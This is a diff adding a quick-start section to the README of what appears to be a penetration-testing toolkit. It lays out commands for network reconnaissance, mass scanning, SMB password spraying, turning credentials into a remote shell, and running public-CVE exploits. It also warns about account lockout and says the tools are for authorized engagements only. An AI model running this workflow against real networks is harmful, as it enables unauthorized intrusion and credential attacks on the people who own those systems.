@@ -1,6 +1,29 @@
 # access/network — recon · credential access · public-CVE · AD · cloud → shell
 > **Which access surface?** You're in `access/network/` — **cred / network-service / public-CVE / AD / cloud**. Siblings: `../web/` (a **web app**) · `../services/` (a **service left open**). (See `../../START-HERE.md`.)
 
+## 🚀 5-minute quick start — from IPs to a shell
+
+Beginner path — three commands:
+
+```bash
+# 1) Recon: what's alive, what services, what buckets apply
+python3 enum_net.py --range 10.0.0.0/24        # live hosts (fast ping/arp sweep)
+python3 enum_net.py --target 10.0.0.5          # deep enum: ports + services + bucket hints per finding
+
+# 2) Many targets (100+ IPs)? Multi-target flow:
+python3 sweep.py plan   --targets targets.txt --oneshot > mass-scan.sh && sh mass-scan.sh
+python3 sweep.py triage --nmap ports.gnmap --nxc smb.txt   # ranked SCOREBOARD -> which host, which generator
+
+# 3) The recommended generator prints the runnable command; paste it:
+python3 gen_shell.py   --target 10.0.0.5 --user admin --pass 'P@ss' --proto smb     # cred -> shell
+python3 gen_spray.py   --proto smb --users users.txt --password 'Season2025!' --target 10.0.0.5   # spray (READ LOCKOUT FIRST)
+python3 gen_exploit.py <cve>                                                          # public-service exploit
+```
+
+`enum_net.py` and `sweep.py triage` both name the exact `gen_XXX.py` per finding — you don't guess. **`sweep.py triage` also accepts `--recce recce-bridge.json`** (recce's confirmed findings) to weight the scoreboard by what's already proven vulnerable. Full loop in [`../../INTEGRATION.md`](../../INTEGRATION.md).
+
+**LOCKOUT SAFETY** — the #1 way to burn a client: **read the AD password policy before any spray** (`nxc smb <dc> -u <u> -p <p> --pass-pol`) and never send a second attempt without one full policy window.
+
 **Get the FIRST code-execution foothold, then hand off to privesc.** Attacker 10.0.0.10. The `gen_*.py`/`enum_net.py`
 scripts run on YOUR box and *print* commands driving nmap/nuclei/netexec/impacket/evil-winrm — you paste the output.
 The foothold this produces is exactly what `winpriv`/`linpriv` assume. **Authorized engagements only.**
